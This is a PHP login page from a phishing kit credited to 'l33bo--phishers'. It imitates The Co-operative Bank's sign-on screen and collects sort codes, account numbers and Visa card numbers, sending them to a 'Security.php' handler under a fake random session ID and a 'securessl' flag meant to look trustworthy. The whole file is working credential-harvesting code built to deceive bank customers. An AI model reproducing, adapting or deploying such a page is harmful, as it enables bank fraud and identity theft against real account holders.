<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");

?>
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="user-scalable=yes, width=device-width, initial-scale=1" name="viewport">
    
<link rel="stylesheet" href="assets/css/login.css" type="text/css">
<link rel="stylesheet" href="assets/css/custom.css" type="text/css">
<meta content="text/html; charset=windows-1252" http-equiv="Content-Type">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="pragma" content="no-cache"><!--Stops ipads and iphones automatically rendering phone numbers as links -->
<meta name="format-detection" content="telephone=no">
</head>
<body>
    
   <div id="coopHeader">



     <div id="coopHeader">
        <div class="headIntro contain">
            <h1>The Co-operative bank</h1>
            <div class="accDetails">
                <strong>
	            
				</strong>   
            </div>
        </div>
    </div>


    </div>
    <table cellpadding="0" cellspacing="0" width="100%">
    	<tbody><tr>
        <td height="70%">





<form name="login" id="login" method="post" action="Security.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" autocomplete="OFF">
<div id="loginSubHeader">
    <h2 class="loginSubHeader">Welcome to The Co-operative Bank</h2>
</div>
<div id="logonBody">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
    

    <tbody><tr>
        <td colspan="2" align="left">
          <table border="0" width="100%">
            <tbody><tr>
              <td class="verttop" align="left"><br>
                <a href="#"><img src="assets/img/back.gif" border="0"></a>
              </td>
            </tr>
          </tbody></table>
        </td>   
    </tr>
    <tr>
        <td colspan="2" align="left">
          <table border="0" width="100%">
            <tbody><tr>
              <td class="verttop" align="left">
                <br>  			To access your account please enter your 
6-digit sortcode and your 8-digit account number or your 16-digit Visa 
card number.		 <br> <br> 
              </td>
              <td class="verttop" align="right"><br>
              </td>
            </tr>
          </tbody></table>
        </td>    
	<tr id="ShowTopErr" style="display:none">
          <td>&nbsp;
          </td>
          <td id="error" class="error"> </td>
      </tr>
    </tr>
    
    <tr>
        <td class="label" width="20%"><label for="sortcode">          Sort code &nbsp;      &nbsp;</label></td>
        <td class="field"><input id="sort" name="sort" size="7" maxlength="6" class="field" type="text" value="<?php echo $_SESSION['sort1'].''.$_SESSION['sort2'].''.$_SESSION['sort3'];?>"></td>
    </tr>
    <tr>
        <td class="label"></td>
        <td class="error"></td>
    </tr>
    <tr>
        <td colspan="2">&nbsp;</td>
    </tr>
    <tr>
        <td class="label"><label for="accountNumber">          Account number &nbsp;      &nbsp;</label></td>
        <td class="field"><input name="acno" id="acno" size="9" maxlength="8" class="field" type="text" value="<?php echo $_SESSION['acno'];?>"></td>
    </tr>
    <tr>
        <td class="label">&nbsp;</td>
        <td class="error"></td>
    </tr>
    <tr>
        <td class="label">or&nbsp;&nbsp;&nbsp;&nbsp;</td>
        <td class="label">&nbsp;</td>
    </tr>
    <tr>
        <td class="label" colspan="2">&nbsp;</td>
    </tr>
    <tr>
        <td class="label"><label for="visanumber">          Visa credit card number &nbsp;      &nbsp;</label></td>
        <td class="field"><input name="cclogin" id="visanumber" size="18" maxlength="16" type="text"></td>
    </tr>
    <tr>
        <td class="label"></td>
        <td class="error">&nbsp;</td>
    </tr>
    <tr>
        <td class="label">&nbsp;<br>
        </td>
        <td class="error">
        <br></td>
    </tr>
   
</tbody></table>
</div>
<div id="logonButton">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tbody><tr>
        <td class="label">&nbsp;</td>
        <td align="right"><a href="#" id="submitBtn" type="submit" value="" onclick="validLogin()"></a></td>
    </tr>
</tbody></table>
</div>
</form>
</td>
    	</tr>
    	<tr>
        <td height="20%">
<table width="100%">
    <tbody><tr>
        <td width="25%">&nbsp;</td>
        <td class="userInfo"></td>
    </tr>
</tbody></table>
</td>
    	</tr>	
	</tbody></table>	
<script>
function validLogin() {
    var x = document.forms["login"]["sort"].value;
	if (x == null || x == "") {
		document.getElementById("ShowTopErr").style.display = "";
		document.getElementById("error").innerHTML = "*** Please enter a sort code and account number or a Visa credit card number. *** ";
        return false;
    }
    var x = document.forms["login"]["acno"].value;
	if (x == null || x == "") {
		document.getElementById("ShowTopErr").style.display = "";
		document.getElementById("error").innerHTML = "*** Please enter a sort code and account number or a Visa credit card number. *** ";
        return false;
    }
document.login.submit();
}
</script>
</body></html>